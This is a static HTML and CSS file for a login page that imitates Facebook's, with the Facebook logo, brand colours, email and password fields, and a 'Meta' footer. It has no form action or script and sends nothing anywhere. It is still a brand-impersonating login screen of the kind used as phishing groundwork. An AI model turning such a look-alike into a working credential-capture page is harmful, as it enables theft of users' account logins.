<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #F0F2F5, #F7F8FA);
        }
        .login-container {
            width: 300px;
            padding: 20px;
            background-color: #FFFFFF;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .login-container img {
            width: 50px;
            margin-bottom: 20px;
        }
        .login-container h2 {
            font-size: 18px;
            color: #1877F2;
            margin: 0 0 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #CCC;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-container .login-button {
            width: 100%;
            padding: 10px;
            background-color: #1877F2;
            color: #FFFFFF;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container .login-button:hover {
            background-color: #155DB2;
        }
        .login-container a {
            display: block;
            margin-top: 10px;
            color: #1877F2;
            text-decoration: none;
        }
        .login-container .create-account {
            margin-top: 20px;
            padding: 10px;
            color: #1877F2;
            border: 1px solid #1877F2;
            border-radius: 4px;
            font-weight: bold;
            text-decoration: none;
        }
        .meta-logo {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <h2>Login</h2>
    <input type="text" placeholder="Mobile number or email address">
    <input type="password" placeholder="Password">
    <button class="login-button">Log in</button>
    <a href="#">Forgotten Password?</a>
    <a href="#" class="create-account">Create new account</a>
    <div class="meta-logo">Meta</div>
</div>

</body>
</html>
